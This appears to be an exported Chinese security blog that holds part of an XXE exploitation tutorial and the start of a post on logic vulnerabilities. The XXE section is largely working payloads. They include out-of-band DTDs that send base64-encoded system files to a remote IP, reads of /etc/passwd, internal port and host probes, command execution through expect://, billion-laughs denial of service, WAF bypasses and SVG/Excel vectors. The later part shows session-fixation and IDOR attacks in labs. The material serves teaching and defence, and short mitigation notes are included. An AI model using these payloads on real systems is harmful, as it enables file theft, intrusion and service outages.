SYSTEM &#x27;http://185.243.241.45/?data=%file;&#x27;&gt;&quot;&gt;%all;\n//攻击payload：&lt;!DOCTYPE updateProfile [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://185.243.241.45/evil.dtd&quot;&gt;%dtd;%send;]&gt;\n2.2.4.查看访问日志\n这里的查看访问日志，是在攻击者的服务器上查看，不要搞错。可以通过下面的图片看到，我们成功获取到日志。\n\n2.2.5.查看日志内容\n由于是base64加密的，所以我们还需要对其进行解密，通过解密可以看到，日志的内容和Windows中的win.ini的内容是一样的。\n\n2.2.6.调用解释\n这里需要结合payload进行理解，不然单单看解释有点难理解。\n  在构建的payload中会发现，可以看到挺难理解的，我们根据构建的payload进行解释一下，首先%dtd去调用vps上的evil.dtd文件，这个有点类似于将evil.dtd文件包含进来的感觉，然后调用evil.dtd文件中的%all，%all再去调用%file，而%file就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到%send 以后(因为实体的值中不能有 %, 所以将其转成html实体16进制编码&amp;#x25；)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，成功解决外带的情况。\n2.3.基于报错案例\n基于报错的原理和无回显类似，无回显通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。所以和无回显的构造方式几乎只有url出不同，其他地方一模一样。\n  简答来说，报错就是将返回的数据，本该返回回去，但由于URL地址是错误的，那么就会出现报错，将数据显示在报错中。\n  参考链接：https://blog.szfszf.top/tech/blind-xxe-详解-google-ctf-一道题目分析/\n2.3.1.引入服务器文件案例\n引入服务器文件的操作和无回显案例基本一致，就是上面提到的解释。\n2.3.1.1.修改配置文件\n这里为了能够实现报错，需要在配置文件中，将不显示报错内容给注释了。\n\n2.3.1.2.构建payload\n首先在攻击者服务器中创建evil.dtd文件，在文件中写入payload，在这个payload中会存在一个alskdnm的地方，原本在无回显中这里会写上服务器的IP地址，但是这里随便写一个不存在的地址，使其能够出现报错。\n&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://alskdnm/?data=%file;&#x27;&gt;&quot;&gt;%start;\n构建攻击的payload的语句\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ENTITY % remote SYSTEM &quot;http://185.243.241.45/evil.dtd&quot;&gt;&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;&gt;%remote;%send;]&gt;&lt;message&gt;1234&lt;/message&gt;\n2.3.1.3.测试效果\n通过返回的数据包内容，可以看到原本应该出现在服务器日志中的编码的数据，现在在前端中了，而这就是基于报错的原因。\n\n2.3.1.4.编码还原\n我们对编码进行还原，查看效果。\n\n2.3.2.通过引入本地文件\n关于引入本地文件，通过上面的参考链接中的作者的话，这样可行，但是引入本地链接，我这边没有靶场，不好进行测试，如果感兴趣可以去作者的文章中去了解一些，但是，引入本地文件，必然不是一件容易的事。实现起来不管是引入外部或内部，都挺困难的。当然在黔驴技穷的时候，这也是一个不错的办法。\n九、探测端口存活\n这里端口探测，经过测试，不管有没有回显，都只能靠响应时间来进行判断，这里如果不好判断，可以优先测试一下正常不会开放的端口，然后查看响应时长，然后再去测试一下，正常会开放的端口，例如：3389、80、443、22、23等端口。然后比较两个响应的时长，通常来说，端口开放了，响应会快一点，而端口未开放则响应会比较慢。\n3.1.探测端口案例\n这里依旧是使用xxelabs靶场做演示，这里我也不改什么回显不回显的情况了，直接进行测试。\n3.1.1.抓包\n这里把抓到的包放入重放器中。\n3.1.2.构建payload\n这里我开放了3389端口以及80端口，未开放22端口以及23端口。我们分别进行测试。\n  这里有两种payload，一种是直接在回显位置修改，一种是不需要管回显位置的内容，同时这里面输入的IP是内网中你想要测试的IP地址以及后面的端口号。这里我只测试一个payload。\n1.payload&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://185.243.241.45:3389&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;2.payload：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://185.243.241.45:3389&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;\n3.1.3.测试开放端口\n这里首先测试3389端口和80端口，注意看右下角的响应时间。\n3.1.3.1.测试3389端口\n在测试3389端口后，页面的响应时间为2312毫秒。\n\n3.1.3.2.测试80端口\n可以看到，我们测试80端口，响应时间为102毫秒。当我们使用第一种payload的时候同时存在回显的话，页面中就会把80端口页面中的信息也显示出来了，这里测试的结果是不是就可以间接性读取内网中其它服务器的敏感文件？\n\n3.1.4.测试未开放端口\n这里测试22端口以及23端口，主要看右下角响应时间，同时你也会发现一个问题。\n3.1.4.1.测试22端口\n测试22端口后，响应的时间达到了21秒多。\n\n3.1.4.2.测试23端口\n其实测试23端口后，发现同样也是21秒多。\n\n3.2.自动化探测端口\n3.2.1.抓包并修改\n这里还是一样将抓到的包，并添加payload。\n3.2.2.发送测试器\n将修改好的包发送到测试器中，然后进行爆破。\n\n3.2.3.设置变化内容\n首先将所有的自动选择的内容全部清除，然后将设定要变化的端口。\n\n3.2.4.设置载荷\n我这里为了测试方便，我就随便输入几个端口，输入端口完成后，点击开始攻击\n\n3.2.5.查看攻击效果\n这里首先需要将列中接受响应计数勾上，然后点击接受响应计数，就会自动将最短的响应时长排在前面，这样我们就能够完成自动化测试了，无需手动测试，这里显示有四个时长短的\n\n3.3.总结\n从响应的时间对比，其实不难看出，当端口开放的时候就可以响应时间就比较快，而端口未开放的时候响应时间就比较长。\n十、探测主机存活\n这里的探测主机存活使用payload的以及判断和探测端口是基本上是一样的，只是将后面的端口取消，这里就放一个payload，需要注意哦，这里是基于xxelabs靶场构建的payload的。正常的payload可以看探测端口案例中构建的第二个payload，那个才是正常的。\npayload：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://192.168.10.51&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;\n4.1.自动化探测主机存活\n这里我就不演示手动测试的了，只演示自动化的。\n4.1.1.设置变化内容\n这里选中主机的最后一位，设置为变化的内容。\n\n4.1.2.设置载荷\n这里由于我就开一台服务器，是185.243.241.45，我们添加45但56与43我都没开启。（离谱的是我没有40这个主机，但却有响应，估计是别人的？）\n\n4.1.3.查看攻击效果\n从攻击的效果的响应时长来看，也就45、40的通的，其它都是不通的。\n\n十一、更改Content-Type类型\n这里就是解释在xxe的盲猜，在不确定是否能够执行的时候，通过修改Content-Type头，让其能够识别xml的语句，实现漏洞利用。更改Content-Type头类型有：application/xml与text/xml。\n5.1.CTF题目案例\nCTF-Jarvis-OJ-Web-XXE(CTF题)访问地址\n5.1.1.抓包\n通过抓包发现该靶场的数据的传输方式是json。\n\n5.1.2.修改类型\n这里我们需要将类型修改为xml。\n\n5.1.3.构建payload\n这里需要将原先下面输出的内容给删除，然后输入上payload。\npayload：&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;x&gt;&amp;b;&lt;/x&gt;\n5.1.4.测试效果\n这里就可以看到我们成功读取到etc下的passwd内容。\n\n十二、内网探测\n和读文件差不多，只不过把URI改成内网机器地址\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY rabbit SYSTEM &quot;http://127.0.0.1/1.txt&quot; &gt;]&gt;&lt;user&gt;&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;&lt;lastname&gt;666&lt;/lastname&gt;&lt;/user&gt;\n十三、RCE\nXXE漏洞利用技巧：从XML到远程代码执行\n这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;catalog&gt;   &lt;core id=&quot;test101&quot;&gt;      &lt;author&gt;John, Doe&lt;/author&gt;      &lt;title&gt;I love XML&lt;/title&gt;      &lt;category&gt;Computers&lt;/category&gt;      &lt;price&gt;9.99&lt;/price&gt;      &lt;date&gt;2018-10-01&lt;/date&gt;      &lt;description&gt;&amp;xxe;&lt;/description&gt;   &lt;/core&gt;&lt;/catalog&gt;\n响应：\n&#123;&quot;error&quot;: &quot;no results for description uid=0(root) gid=0(root) groups=0(root)...\n十四、DOS\nXXE萌新进阶全攻略\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE lolz [  &lt;!ENTITY lol &quot;lol&quot;&gt;  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;\n此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。\n亦或者，如果目标是UNIX系统，\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n如果 XML 解析器尝试使用/dev/random文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。\n十五、绕过姿势\n参考cl4y师傅博客xxe笔记\n绕过WAF保护的XXE\nENTITY``SYSTEM``file等关键词被过滤\n使用编码方式绕过：UTF-16BE\ncat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml\n若http被过滤，可以\n6.1.data://协议绕过\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a &quot; &lt;!ENTITY %  b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt; &quot;&gt;     %a;    %b;]&gt;&lt;test&gt;&amp;hhh;&lt;/test&gt;\n6.2.file://协议加文件上传\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a SYSTEM &quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;    %a;]&gt;&lt;!--上传文件--&gt;&lt;!ENTITY % b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt;\n6.3.php://filter协议加文件上传\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a SYSTEM &quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;    %a;]&gt;    &lt;test&gt;        &amp;hhh;    &lt;/test&gt;&lt;!--上传文件--&gt;&lt;!ENTITY hhh SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;&gt;\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;    %a;]&gt;    &lt;test&gt;        &amp;hhh;    &lt;/test&gt;&lt;!--上传文件--&gt;PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==\n6.4 其他\n方法1：文档中的额外空格方法2：格式无效方法3: 外来编码（Exotic encodings）方法4：在一个文档中使用两种类型的编码\n参考：https://xz.aliyun.com/t/4059    --绕过方法\n十六、利用场景\n7.1.svg\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note [&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;]&gt;&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;&lt;/svg&gt;\ntips:从当前文件夹读取文件可以使用/proc/self/cwd\n7.2.excel\n利用EXCEL进行XXE攻击\n首先用excel创建一个空白的xlsx，然后解压\nmkdir XXE &amp;&amp; cd XXEunzip ../XXE.xlsx\n将[Content_Types].xml改成恶意xml，再压缩回去\nzip -r ../poc.xlsx *\n7.3 微信支付漏洞分析\n实例二：微信支付的 XXE\n前一阵子非常火的微信支付的 XXE 漏洞当然不得不提，当然目前我是看不懂的，所以就先了解一下\n漏洞描述：\n微信支付提供了一个 api 接口，供商家接收异步支付结果，微信支付所用的java sdk在处理结果时可能触发一个XXE漏洞，攻击者可以向这个接口发送构造恶意payloads,获取商家服务器上的任何信息，一旦攻击者获得了敏感的数据 (md5-key and merchant-Id etc.)，他可能通过发送伪造的信息不用花钱就购买商家任意物品\n我下载了 java 版本的 sdk 进行分析，这个 sdk 提供了一个 WXPayUtil 工具类，该类中实现了xmltoMap和maptoXml这两个方法，而这次的微信支付的xxe漏洞爆发点就在xmltoMap方法中\n如图所示：\n\n问题就出现在我横线划出来的那部分，也就是简化为下面的代码：\npublic static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception &#123;        try &#123;            Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;();            DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder();            InputStream stream = new ByteArrayInputStream(strXML.getBytes(&quot;UTF-8&quot;));            org.w3c.dom.Document doc = documentBuilder.parse(stream);            ...\n我们可以看到 当构建了 documentBuilder 以后就直接对传进来的 strXML 解析了，而不巧的是 strXML 是一处攻击者可控的参数，于是就出现了 XXE 漏洞，下面是我实验的步骤\n首先我在 com 包下又新建了一个包，来写我们的测试代码，测试代码我命名为 test001.java\n如图所示：\n\ntest001.java\npackage com.test.test001;import java.util.Map;import static com.github.wxpay.sdk.WXPayUtil.xmlToMap;public class test001 &#123;    public static void main(String args[]) throws Exception &#123;        String xmlStr =&quot;&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;\\r\\n&quot; +                &quot;&lt;!DOCTYPE XDSEC [\\r\\n&quot; +                &quot;&lt;!ENTITY xxe SYSTEM &#x27;file:///d:/1.txt&#x27;&gt;]&gt;\\r\\n&quot; +                &quot;&lt;XDSEC&gt;\\r\\n&quot;+                &quot;&lt;XXE&gt;&amp;xxe;&lt;/XXE&gt;\\r\\n&quot; +                &quot;&lt;/XDSEC&gt;&quot;;        try&#123;            Map&lt;String,String&gt; test = xmlToMap(xmlStr);            System.out.println(test);        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;\n我希望它能读取我 D 盘下面的 1.txt 文件\n运行后成功读取\n如图所示：\n\n当然，WXPayXmlUtil.java 中有这个 sdk 的配置项，能直接决定实验的效果，当然后期的修复也是针对这里面进行修复的\nhttp://apache.org/xml/features/disallow-doctype-decl truehttp://apache.org/xml/features/nonvalidating/load-external-dtd falsehttp://xml.org/sax/features/external-general-entities falsehttp://xml.org/sax/features/external-parameter-entities false\n整个源码我打包好了已经上传到我的百度云，有兴趣的童鞋可以运行一下感受：\n\n链接：https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw 提取码：xq1b\n\n上面说过 java 中有一个 netdoc:/ 协议能代替 file:/// ,我现在来演示一下：\n如图所示：\n\n十七、XXE漏洞防御\n8.1.禁用外部实体\n使用开发语言提供的禁用外部实体的方法。\nPHP：libxml_disable_entity_loader(true);java:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n8.2.过滤数据\n可以将用户提交的xml数据进行过滤，例如关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。\n十三、参考\nhttps://blog.szfszf.top/tech/blind-xxe-详解-google-ctf-一道题目分析/\nhttps://www.cnblogs.com/20175211lyz/p/11413335.html\nhttps://xz.aliyun.com/t/3357#toc-8\n​\t\thttps://www.cnblogs.com/zhengna/p/15740341.html   --靶场实践参考\n","categories":["常见top漏洞"]},{"title":"逻辑漏洞","url":"/2023/07/29/%E6%B5%85%E6%9E%90%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","content":"浅析逻辑漏洞\n1. 漏洞介绍\n1.1 成因\n设计阶段产生，老司机也会产生、相对难发现、难以防护，相对容易利用 第三方逻辑缺陷、没有在设计初期进行安全审计、安全水平及对安全认知程度不一致\n\t逻辑漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误，一般出现任意密码修改（没有旧密码验证）、越权访问、密码找回、交易支付金额等。\n\n​\t\t逻辑漏洞是指攻击者利用业务/功能上的设计缺陷，获取敏感信息或破坏业务的完整性, 逻辑漏洞的破坏方式并非是向程序添加破坏内容，而是利用逻辑处理不严密或者代码问题或固有不足，操作上并不影响程序的允许，在逻辑上是顺利执行的。\n这种漏洞一般防护手段或设备无法阻止，因为走的是合法流量也没有防御标准。\n1.2 分析\n​\t\t对常见的漏洞进行过统计，发现其中越权操作和逻辑漏洞占比最高，很多平台中基本都有发现，包括任意查询用户信息、任意删除等行为；最严重的漏洞出现在账号安全，包括重置任意用户密码、验证码暴力破解等。\n逻辑漏洞的重要性\n常见的OWASP漏洞，通过漏洞扫描工具，大多支持自动化或者半自动化扫描出来，并且传统的安全设备或者防护措施收效甚微\n​\t\t但逻辑漏洞是和系统自身功能和逻辑有关系的漏洞，每一家的漏洞出现可能存在一定的独特性，很难复制或者通过规则脚本和漏扫工具扫描出来，因此逻辑漏洞大多需要配合代码审计和手段测试才可以发现相关漏洞，也是工具无法代替人工的漏洞。\n\n2. 逻辑漏洞详解\n2.1 常见的逻辑漏洞\n逻辑漏洞的分类    越权漏洞    密码需改    密码找回    验证码漏洞    支付漏洞    投票/积分/抽奖    短信轰炸即：交易支付、密码修改、密码找回、越权修改、越权查询、突破限制等各类逻辑漏洞。\n2.2 如何挖掘逻辑漏洞\n确定业务流程---&gt;寻找流程中可以被操控的环节---&gt;分析可被操控环节中可能产生的逻辑问题---&gt;尝试修改参数触发逻辑问题        \n\n2.3 身份验证漏洞\n1. 暴力破解漏洞\n漏洞介绍：攻击者可以通过该漏洞获取用户名和对应弱口令密码，并进行登录操作\n漏洞原理：由于没有设置登录失败次数限制，导致攻击者可以通过口令字典进行特定用户的密码爆破或通过用户名字典进行特定弱口令的用户枚举\n漏洞点：系统登录点\n漏洞修复： 对于固定用户名爆破密码\n\n可以针对用户名进行错误次数计算，高于一定阈值账号锁定一段时间，或者添加验证码\n但是不能永久锁定，可能被用来进行账户恶意锁定\n\n对于固定密码枚举用户名、 需要计算IP对URL的请求情况，某个IP短时间大量请求登录应该加入黑名单 进行传输数据加密有一定的防护效果\n2. Session固定攻击\n漏洞介绍：会话固定攻击是利用服务器的session不变机制，借他人之手获得认证和授权，然后冒充他人\n漏洞原理：在请求登录过程时候，URL带有一个session，登录成功之后会将登录成功的信息绑定到这个session中，攻击者可以发送带有session的URL给相关工作人员诱导其登录，相当于获取了其身份信息\n攻击流程：\n1、攻击者Attacker能正常访问该应用网站；2、应用网站服务器返回一个会话ID给他；3、攻击者Attacker用该会话ID构造一个该网站链接发给受害者Victim；4-5、受害者Victim点击该链接，携带攻击者的会话ID和自己的用户名密码正常登录了该网站，会话成功建立；6、攻击者Attacker用该会话ID成功冒充并劫持了受害者Victim的会话。这里相当于受害者用该会话ID登录后，便将该会话ID提权为管理员了，而我们攻击者凭借该会话ID去登录该网站时，成功以管理员的身份进入，当然这里受害者是普通用户也是可以的\n漏洞点：在GET方法请求登录时候带有session值\n访问网站（未登录）：获取cookie信息，获取sessionid登录网站：查看cookie信息，获取sessionid查看登录前，登录后sessionid是否相同，若相同，则存在该漏洞\n修复思路：\n\n只要避免在URL中带入session信息即可比较有效的防御\n另外也要注意POST请求中带有sessionid进行session固定攻击，虽然可利用性比较低，但是建议修复\n\n漏洞实战\n这里用YXcms建站系统复现，由于源代码太难找了，这里就跟着走吧…\n复现过程\nyxcms允许我们自定义session，而且这个过程通过get方式来完成。我觉得这样的问题属于CSRF，不经意之间就能获取大效果。其问题代码如下：\n&lt;?php&lt;br&gt;//公共类&lt;br&gt;class commonController extends baseController&#123;public function __construct()&lt;br&gt; &#123;&lt;br&gt; parent::__construct();&lt;br&gt;        if(!empty($_GET[&#x27;phpsessid&#x27;])) session_id($_GET[&#x27;phpsessid&#x27;]);//通过GET方法传递sessionid,firefox&lt;br&gt;        session_starts();&lt;br&gt; ……\n当$_GET[‘phpsessid’]非空时，就令session_id为我们传入的值。\n于是我们构造一个链接让管理员点击，管理员点击后会重新设置他的session，而且这个session就是我们构造的。因为session重置了所以管理员也需要重新登录，而重新登录后其session_id就是我们构造的。我们只要利用这个session_id就能登录管理后台了。\n比如我构造一个链接：\nhttp://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456\n将这个链接发给受害者（火狐浏览器），诱使受害者管理员点击该链接，点击后后会跳转到登录页面，但此时他的phpsession已经是我们构造的f4cking456了\n\n此时如果受害者登录这个网址，那么这个session就有后台权限了。\n假如受害者登录该网址\n\n那么我们利用这个链接\nhttp://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456，将自己的session设置成f4cking456，或者随意怎么修改，只要把phpsessid修改成f4cking123就能拥有后台权限了\n这时攻击者（谷歌浏览器）访问该链接，直接进入后台界面\n\n有个前提就是，实战过程中你需要知道该网站后台地址是什么\n3. Cookie欺骗漏洞\n漏洞介绍：通过伪造cookie信息能够伪造其他用户进行登录。\n漏洞原理：开发者为了方便将身份信息/登录信息明文或者只是简单编码、哈希之后存放在cookie中，网站通过获取得到的cookie进行授权或者身份验证\n漏洞点：cookie中有明显或者只是简单编码、哈希的字段时候 修改lsLogin值为1可以判定为用户已经登录 修改cookie为asp163=UserName=admin\n漏洞修复： Cookie不应该存储可理解的身份信息和登录信息 按照规定，cookie对身份信息和登录信息的存储只能通过存储足够长度的随机字符串进行，避免篡改\n漏洞实战\n大体就是通过某种手段获取其他用户或者管理员的cookie，而由于该cookie存储的是可理解的身份信息和登录信息，则攻击者获取该cookie后，凭借该cookie登录网站便可以实现免密登录到其他用户或者管理员页面\n2.4 权限类逻辑漏洞\n权限相关逻辑漏洞是逻辑漏洞中出现的最多的漏洞\n1. 平行权限跨越\n漏洞介绍：即普通用户/管理员能访问其他普通用户/管理员才能够访问的系统信息或者系统功能\n形成原因：在进行方法调用时候未进行请求用户和目标信息拥有者是否匹配一致，直接用userid/email之类的容易遍历的参数进行数据库查询\n漏洞点：在普通用户/管理员登录后的能访问的链接或者功能中都可能存在\n漏洞修复：\n在权限管理中，平行越权的权限管理颗粒度最小\n需要在方法中进行相关的获取请求request，再利用getAttribute(“userid”)获取其userid，直接使用该userid作为参数进行数据增删查改，避免userid参数传输\n漏洞复现\n登录，同时bp抓包：\n\n\n放包，可以看到当前的test用户（这里放包了很多次…）\n\n在这里可以看到这个card_id对应的就是每个用户对应的id\n发送到爆破模块遍历一下，这里他是对后两位进行的遍历\n\n\n然后来到登录界面，右键查看马春生的图片，检查源代码属性：发现其id尾号以16结尾，我们开始爆破\n\n这里就是马春生的个人信息\n\n我们将密码拿去md5破解一下\n\n随后凭借该用户名和密码登录即可，成功拿到key\n\n漏洞总结\n先公布一下背景\n钻石代理商马春生同学卷款逃跑，多位下级代理内心受到了难以磨灭的伤害，为了找到她我们将通过代理网站获取到她的手机号码等信息。\n这里我也是跟着教程做的，因此几乎没有自己的思考，为了不摸鱼，还是浅浅总结一下\n题目告知我们重点是马春生，那我们便要实现水平越权以便以马春生的用户信息登录网站，那我们进入靶场（我尽可能的以实战的思路来吧），首先就是搜集信息，burp抓包，F12这些肯定是少不了的，这里也是学到了一点东西，搜集信息尤为重要\n这里在实战中就是会费时间，这里我陈述的也就是凭借答案来陈述吧，所以会参考性低一些我们burp抓包，然后观察抓到的东西，一次次放包查看什么时候会有重要信息，随后我们在放包的过程中，很幸运在url头发现了有关证明用户信息的id，并且联系我们之前对页面的那些图片的查看，发现图片的src处有一堆数字，这与我们发现的用户id及其相似，那我们有理由推断那就是马春生同学的用户id，但我们只能了解到这里，想要获取他的用户名密码便无从下手，于是我们通过burp的爆破模块，对用户id后两位进行遍历，成功在id=16处（也就是马春生同学的id）发现了马春生的详细个人信息，至此我们成功实现水平越权（服务端没有对用户id做出精确的维护）\n2. 垂直权限跨越\n漏洞介绍：即普通用户能够访问管理员甚至超级管理员才能够访问的系统信息或者系统功能\n形成原因：程序在方法调用时候，缺少角色等级校验\n漏洞点：在任何用户登录后才能访问的链接或者功能中都可能存在\n对每一个传输的参数都要了解参数的目的，尝试将用户名改为admin尝试绕过\n漏洞修复：\n需要校验用户是否有权限访问这个方法\n获取请求request，再利用getAuttribute(“roleid”)获取其角色等级，检查角色等级是否合法，错误则直接返回错误跳转，返回页面必须仍然从Attribute中获取userid再进一步查询相关信息，值得注意的是切勿将错误跳转写到Javascript里面，还返回目标URL页面的相关信息。\nCouchdb 垂直越权（CVE-2017-12635）\nCouchdb简介\tApache CouchDB是一个开源数据库，专注于易用性和成为&quot;完全拥抱web的数据库&quot;。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。​ 在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。​ 影响版本：Apache CouchDB before 1.7.0 and 2.x before 2.1.1\n漏洞成因\n问题在于 Javascript JSON 解析器（在验证脚本中使用）与 CouchDB 内部使用的名为jiffy的解析器之间存在差异。查看每个对象如何处理对象上的重复键，例如：&#123;&quot;foo&quot;:&quot;bar&quot;, &quot;foo&quot;:&quot;baz&quot;&#125;\nErlang：\n&gt; jiffy:decode(&quot;&#123;\\&quot;foo\\&quot;:\\&quot;bar\\&quot;, \\&quot;foo\\&quot;:\\&quot;baz\\&quot;&#125;&quot;). &#123;[&#123;&lt;&lt;&quot;foo&quot;&gt;&gt;,&lt;&lt;&quot;bar&quot;&gt;&gt;&#125;,&#123;&lt;&lt;&quot;foo&quot;&gt;&gt;,&lt;&lt;&quot;baz&quot;&gt;&gt;&#125;]&#125;\nJavaScript：\n&gt; JSON.parse(&quot;&#123;\\&quot;foo\\&quot;:\\&quot;bar\\&quot;, \\&quot;foo\\&quot;: \\&quot;baz\\&quot;&#125;&quot;)&#123;foo: &quot;baz&quot;&#125;\n对于给定的键，Erlang 解析器将存储这两个值，但 Javascript 解析器将仅存储最后一个值。不幸的是，CouchDB 数据内部表示的 get_value 函数只会返回第一个值：\n% Within couch_util:get_value lists:keysearch(Key, 1, List).  % keysearch(Key, N, TupleList) -&gt; &#123;value, Tuple&#125; | false% Searches the list of tuples TupleList for a tuple whose Nth element compares equal to Key. Returns &#123;value, Tuple&#125; if such a 